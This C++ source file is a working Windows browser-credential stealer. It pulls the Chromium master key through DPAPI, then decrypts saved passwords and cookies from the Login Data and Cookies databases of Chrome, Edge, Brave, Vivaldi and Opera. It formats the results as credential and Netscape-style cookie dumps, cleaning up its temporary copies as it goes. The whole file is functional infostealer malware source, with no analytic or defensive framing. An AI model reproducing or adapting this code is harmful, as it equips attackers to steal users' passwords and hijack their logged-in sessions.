#include <windows.h>
#include <shlobj.h>
#include <filesystem>
#include <fstream>
#include <vector>
#include <iostream>
#include <wincrypt.h>

#include "ChromiumStealer.h"
#include "../crypto/Base64.h"
#include "../crypto/AesGcm.h"
#include "../utils/Logger.h"
#include <nlohmann/json.hpp>
#include <sqlite3.h>

#pragma comment(lib, "crypt32.lib")

namespace credential {

    namespace fs = std::filesystem;

    namespace {
        std::vector<BYTE> GetMasterKey(const std::string& localStatePath) {
            try {
                if (!fs::exists(localStatePath)) {
                    LOG_DEBUG("Local State not found: " + localStatePath);
                    return {};
                }

                // Copy Local State to temp to avoid potential locks
                char tempPath[MAX_PATH];
                GetTempPathA(MAX_PATH, tempPath);
                std::string tempLocalState = std::string(tempPath) + "ls_" + std::to_string(GetTickCount64());
                if (!CopyFileA(localStatePath.c_str(), tempLocalState.c_str(), FALSE)) {
                    LOG_DEBUG("Failed to copy Local State, reading directly");
                    tempLocalState = localStatePath; // Fallback to direct read
                }

                std::ifstream f(tempLocalState);
                if (!f.is_open()) {
                    LOG_ERR("Failed to open Local State: " + tempLocalState);
                    return {};
                }
                nlohmann::json j;
                f >> j;
                if (tempLocalState != localStatePath) DeleteFileA(tempLocalState.c_str());

                if (!j.contains("os_crypt") || !j["os_crypt"].contains("encrypted_key")) {
                    LOG_ERR("Local State JSON missing os_crypt/encrypted_key");
                    return {};
                }

                std::string encryptedKeyB64 = j["os_crypt"]["encrypted_key"];
                std::vector<BYTE> encryptedKey = crypto::Base64Decode(encryptedKeyB64);

                // Remove "DPAPI" prefix (5 bytes)
                if (encryptedKey.size() < 5) {
                    LOG_ERR("Encrypted key too short");
                    return {};
                }
                std::vector<BYTE> dpapiEncryptedKey(encryptedKey.begin() + 5, encryptedKey.end());

                DATA_BLOB in;
                in.pbData = dpapiEncryptedKey.data();
                in.cbData = (DWORD)dpapiEncryptedKey.size();
                DATA_BLOB out;

                if (CryptUnprotectData(&in, NULL, NULL, NULL, NULL, 0, &out)) {
                    std::vector<BYTE> masterKey(out.pbData, out.pbData + out.cbData);
                    LocalFree(out.pbData);
                    LOG_DEBUG("Successfully retrieved Chromium Master Key from: " + localStatePath);
                    return masterKey;
                } else {
                    LOG_ERR("CryptUnprotectData failed for master key");
                }
            } catch (const std::exception& e) {
                LOG_ERR("Exception in GetMasterKey: " + std::string(e.what()));
            } catch (...) {
                LOG_ERR("Unknown exception in GetMasterKey");
            }
            return {};
        }

        std::string DecryptPassword(const std::vector<BYTE>& ciphertext, const std::vector<BYTE>& masterKey) {
            if (ciphertext.empty()) return "";

            // Modern Chromium: v10/v11 (AES-GCM)
            if (ciphertext.size() >= 15 && (ciphertext[0] == 'v' && (ciphertext[1] == '1' || ciphertext[1] == '2'))) {
                try {
                    // Check for v10, v11, v20 etc.
                    // Structure: prefix (3 bytes) + IV (12 bytes) + EncryptedData + Tag (16 bytes)
                    if (ciphertext.size() < 3 + 12 + 16) return "";

                    std::vector<BYTE> iv(ciphertext.begin() + 3, ciphertext.begin() + 15);
                    std::vector<BYTE> payloadToDecrypt(ciphertext.begin() + 15, ciphertext.end());

                    if (masterKey.empty()) return "";

                    crypto::AesGcm aes(masterKey);
                    std::vector<BYTE> decrypted = aes.decrypt(payloadToDecrypt, iv);
                    return std::string(decrypted.begin(), decrypted.end());
                } catch (...) {
                    return "";
                }
            }

            // Legacy Chromium or others: DPAPI directly
            DATA_BLOB in;
            in.pbData = (BYTE*)ciphertext.data();
            in.cbData = (DWORD)ciphertext.size();
            DATA_BLOB out;

            if (CryptUnprotectData(&in, NULL, NULL, NULL, NULL, 0, &out)) {
                std::string decrypted((char*)out.pbData, out.cbData);
                LocalFree(out.pbData);
                return decrypted;
            }

            return "";
        }

        void SafeCopyDatabase(const std::string& src, const std::string& dest) {
            CopyFileA(src.c_str(), dest.c_str(), FALSE);
            // Also copy sidecars if they exist (WAL mode)
            std::string wal = src + "-wal";
            std::string shm = src + "-shm";
            if (fs::exists(wal)) CopyFileA(wal.c_str(), (dest + "-wal").c_str(), FALSE);
            if (fs::exists(shm)) CopyFileA(shm.c_str(), (dest + "-shm").c_str(), FALSE);
        }

        void SafeDeleteDatabase(const std::string& path) {
            DeleteFileA(path.c_str());
            DeleteFileA((path + "-wal").c_str());
            DeleteFileA((path + "-shm").c_str());
        }
    }

    std::string DumpChromiumPasswords() {
        std::string report = "BROWSER_CREDENTIALS:\n";
        report += "BROWSER | URL | USERNAME | PASSWORD\n";
        report += "--------------------------------------------------------------------------------\n";

        char path[MAX_PATH];
        char appDataPath[MAX_PATH];
        std::string localAppData = "";
        std::string roamingAppData = "";

        if (SUCCEEDED(SHGetFolderPathA(NULL, CSIDL_LOCAL_APPDATA, NULL, 0, path))) {
            localAppData = path;
        }
        if (SUCCEEDED(SHGetFolderPathA(NULL, CSIDL_APPDATA, NULL, 0, appDataPath))) {
            roamingAppData = appDataPath;
        }
            
        struct BrowserPath {
            std::string name;
            std::string userDataPath;
            bool isRoaming;
        };

        std::vector<BrowserPath> browsers = {
            {"Chrome", localAppData + "\\Google\\Chrome\\User Data", false},
            {"Chrome Beta", localAppData + "\\Google\\Chrome Beta\\User Data", false},
            {"Chrome Dev", localAppData + "\\Google\\Chrome Dev\\User Data", false},
            {"Edge", localAppData + "\\Microsoft\\Edge\\User Data", false},
            {"Brave", localAppData + "\\BraveSoftware\\Brave-Browser\\User Data", false},
            {"Vivaldi", localAppData + "\\Vivaldi\\User Data", false},
            {"Opera", roamingAppData + "\\Opera Software\\Opera Stable", true},
            {"Opera GX", roamingAppData + "\\Opera Software\\Opera GX Stable", true}
        };

        for (const auto& browser : browsers) {
            if (!fs::exists(browser.userDataPath)) continue;

            std::string localState;
            if (browser.isRoaming) {
                // For Opera, Local State is often in the same dir as Login Data or up one level
                localState = browser.userDataPath + "\\Local State";
            } else {
                localState = browser.userDataPath + "\\Local State";
            }

            std::vector<BYTE> key = GetMasterKey(localState);
            // We don't continue if key is empty because some might use legacy DPAPI

            try {
                for (auto it = fs::recursive_directory_iterator(browser.userDataPath); it != fs::recursive_directory_iterator(); ++it) {
                    try {
                        const auto& entry = *it;
                        if (entry.path().filename() == "Login Data") {
                            std::string loginData = entry.path().string();
                            
                            char tempPath[MAX_PATH];
                            GetTempPathA(MAX_PATH, tempPath);
                            std::string tempDb = std::string(tempPath) + "ld_" + std::to_string(GetTickCount64());

                            SafeCopyDatabase(loginData, tempDb);

                            sqlite3* db;
                            if (sqlite3_open_v2(tempDb.c_str(), &db, SQLITE_OPEN_READONLY, NULL) == SQLITE_OK) {
                                LOG_DEBUG("Opened " + browser.name + " Login Data: " + loginData);
                                const char* query = "SELECT origin_url, username_value, password_value FROM logins";
                                sqlite3_stmt* stmt;
                                if (sqlite3_prepare_v2(db, query, -1, &stmt, NULL) == SQLITE_OK) {
                                    while (sqlite3_step(stmt) == SQLITE_ROW) {
                                        const char* url_ptr = (const char*)sqlite3_column_text(stmt, 0);
                                        const char* user_ptr = (const char*)sqlite3_column_text(stmt, 1);
                                        if (!url_ptr || !user_ptr) continue;

                                        std::string url = url_ptr;
                                        std::string username = user_ptr;
                                        const void* blob = sqlite3_column_blob(stmt, 2);
                                        int blobLen = sqlite3_column_bytes(stmt, 2);
                                        
                                        if (blobLen > 0) {
                                            std::vector<BYTE> encryptedPass((BYTE*)blob, (BYTE*)blob + blobLen);
                                            std::string password = DecryptPassword(encryptedPass, key);

                                            if (!password.empty() && !username.empty()) {
                                                report += browser.name + " | " + url + " | " + username + " | " + password + "\n";
                                            }
                                        }
                                    }
                                    sqlite3_finalize(stmt);
                                }
                                sqlite3_close(db);
                            }
                            SafeDeleteDatabase(tempDb);
                        }
                    } catch (...) {}

                    if (it.depth() > 3) it.disable_recursion_pending();
                }
            } catch (...) {}
        }

        return report;
    }

    std::string StealChromiumCookies() {
        std::stringstream resultSS;
        resultSS << "# CHROMIUM COOKIE STEALER RESULTS\n";
        int cookieCount = 0;

        char path[MAX_PATH];
        char appDataPath[MAX_PATH];
        std::string localAppData = "";
        std::string roamingAppData = "";

        if (SUCCEEDED(SHGetFolderPathA(NULL, CSIDL_LOCAL_APPDATA, NULL, 0, path))) {
            localAppData = path;
        }
        if (SUCCEEDED(SHGetFolderPathA(NULL, CSIDL_APPDATA, NULL, 0, appDataPath))) {
            roamingAppData = appDataPath;
        }

        struct BrowserPath {
            std::string name;
            std::string userDataPath;
            bool isRoaming;
        };

        std::vector<BrowserPath> browsers = {
            {"Chrome", localAppData + "\\Google\\Chrome\\User Data", false},
            {"Edge", localAppData + "\\Microsoft\\Edge\\User Data", false},
            {"Brave", localAppData + "\\BraveSoftware\\Brave-Browser\\User Data", false},
            {"Opera", roamingAppData + "\\Opera Software\\Opera Stable", true},
            {"Opera GX", roamingAppData + "\\Opera Software\\Opera GX Stable", true}
        };

        for (const auto& browser : browsers) {
            if (!fs::exists(browser.userDataPath)) continue;

            std::string localState = browser.userDataPath + "\\Local State";
            std::vector<BYTE> key = GetMasterKey(localState);

            try {
                for (auto it = fs::recursive_directory_iterator(browser.userDataPath); it != fs::recursive_directory_iterator(); ++it) {
                    try {
                        const auto& entry = *it;
                        std::string filename = entry.path().filename().string();
                        if (filename == "Cookies" || filename == "Network\\Cookies") {
                            // Note: entry.path().filename() only returns "Cookies" if it's in the current dir.
                            // If it's Network\Cookies, filename() might just be "Cookies".
                        }

                        if (filename == "Cookies") {
                            std::string cookiesPath = entry.path().string();

                            char tempPath[MAX_PATH];
                            GetTempPathA(MAX_PATH, tempPath);
                            std::string tempDb = std::string(tempPath) + "ck_" + std::to_string(GetTickCount64());

                            SafeCopyDatabase(cookiesPath, tempDb);

                            sqlite3* db;
                            if (sqlite3_open_v2(tempDb.c_str(), &db, SQLITE_OPEN_READONLY, NULL) == SQLITE_OK) {
                                LOG_DEBUG("Opened " + browser.name + " Cookies: " + cookiesPath);
                                const char* query = "SELECT host_key, path, is_secure, expires_utc, name, encrypted_value FROM cookies";
                                sqlite3_stmt* stmt;
                                if (sqlite3_prepare_v2(db, query, -1, &stmt, NULL) == SQLITE_OK) {
                                    while (sqlite3_step(stmt) == SQLITE_ROW) {
                                        const char* host = (const char*)sqlite3_column_text(stmt, 0);
                                        const char* cpath = (const char*)sqlite3_column_text(stmt, 1);
                                        int isSecure = sqlite3_column_int(stmt, 2);
                                        sqlite3_int64 expiry = sqlite3_column_int64(stmt, 3);
                                        const char* name = (const char*)sqlite3_column_text(stmt, 4);

                                        const void* blob = sqlite3_column_blob(stmt, 5);
                                        int blobLen = sqlite3_column_bytes(stmt, 5);

                                        if (blobLen > 0) {
                                            std::vector<BYTE> encryptedVal((BYTE*)blob, (BYTE*)blob + blobLen);
                                            std::string value = DecryptPassword(encryptedVal, key);

                                            if (!value.empty()) {
                                                // Chromium expiry is microseconds since 1601. Convert to unix for standard format?
                                                // Standard Netscape format uses seconds since 1970.
                                                long long unixExpiry = (expiry / 1000000) - 11644473600LL;
                                                if (unixExpiry < 0) unixExpiry = 0;

                                                resultSS << (host ? host : "") << "\t"
                                                         << ((host && *host == '.') ? "TRUE" : "FALSE") << "\t"
                                                         << (cpath ? cpath : "") << "\t"
                                                         << (isSecure ? "TRUE" : "FALSE") << "\t"
                                                         << unixExpiry << "\t"
                                                         << (name ? name : "") << "\t"
                                                         << value << "\n";
                                                cookieCount++;
                                            }
                                        }
                                    }
                                    sqlite3_finalize(stmt);
                                } else {
                                    LOG_ERR("Failed to prepare cookie query for " + browser.name);
                                }
                                sqlite3_close(db);
                            }
                            SafeDeleteDatabase(tempDb);
                        }
                    } catch (...) {}

                    if (it.depth() > 3) it.disable_recursion_pending();
                }
            } catch (...) {}
        }

        std::stringstream finalOut;
        finalOut << "# Total Chromium cookies extracted: " << cookieCount << "\n";
        finalOut << resultSS.str();
        return finalOut.str();
    }

}
